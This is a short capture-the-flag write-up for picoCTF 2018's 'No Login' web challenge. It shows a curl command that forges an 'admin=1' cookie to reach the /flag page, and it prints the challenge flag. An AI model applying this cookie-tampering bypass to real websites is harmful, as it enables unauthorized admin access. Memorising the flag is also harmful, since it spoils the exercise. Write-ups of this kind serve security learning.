# No Login
Web Exploitation - 200 points

## Challenge 
> Looks like someone started making a website but never got around to making a login, but I heard there was a flag if you were the admin. http://2018shell2.picoctf.com:39670

## Hint
> What is it actually looking for in the cookie?


## Solution


I got confused with the session cookie, but the solution is simply to create an `admin` cookie and do a GET request to `/flag`


	$ curl -s --cookie "admin=1" -L http://2018shell2.picoctf.com:39670/flag | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{n0l0g0n_n0_pr0bl3m_50e16a5c}</code></p>


References:
- https://support.portswigger.net/customer/portal/articles/1783055-Installing_Configuring%20your%20Browser.html
- https://support.portswigger.net/customer/portal/articles/1964073-using-burp-to-hack-cookies-and-manipulate-sessions

## Flag

	picoCTF{n0l0g0n_n0_pr0bl3m_50e16a5c}
